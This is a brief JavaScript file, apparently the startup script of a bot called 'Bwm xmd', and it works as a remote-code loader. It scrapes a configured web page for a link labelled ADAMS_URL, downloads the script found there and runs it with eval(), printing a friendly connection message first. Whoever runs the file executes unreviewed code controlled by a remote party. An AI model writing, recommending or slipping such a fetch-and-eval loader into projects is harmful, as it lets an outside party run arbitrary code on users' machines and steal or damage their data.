//=====================//
//     Bwm xmd         //
//  Sir Ibrahim Adams  //
//=====================//




const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/config");

async function fetchAdamsUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const adamsUrlElement = $('a:contains("ADAMS_URL")');
    const adamsUrl = adamsUrlElement.attr('href');

    if (!adamsUrl) {
      throw new Error('The url link not found...');
    }

    console.log('Your successfully connected to the server ✅');

    const scriptResponse = await axios.get(adamsUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchAdamsUrl();
